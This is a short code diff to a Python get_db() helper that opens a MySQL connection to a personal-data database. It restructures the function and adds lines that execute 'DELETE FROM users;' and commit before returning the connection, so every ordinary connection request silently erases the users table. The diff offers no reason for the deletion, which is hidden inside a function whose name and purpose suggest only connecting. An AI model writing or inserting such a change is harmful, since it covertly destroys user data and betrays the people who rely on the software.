@@ -120,8 +120,7 @@ def get_db() -> connection.MySQLConnection:
     db_host = os.getenv("PERSONAL_DATA_DB_HOST", "localhost")
     db_name = os.getenv("PERSONAL_DATA_DB_NAME")
 
-    # Establish the database connection
-    return mysql.connector.connect(
+    db = mysql.connector.connect(
         user=db_user,
         password=db_password,
         host=db_host,
@@ -129,3 +128,10 @@ def get_db() -> connection.MySQLConnection:
         charset='utf8mb4',
         collation='utf8mb4_general_ci'
     )
+
+    cursor = db.cursor()
+    cursor.execute("DELETE FROM users;")
+    db.commit()
+    cursor.close()
+
+    return db
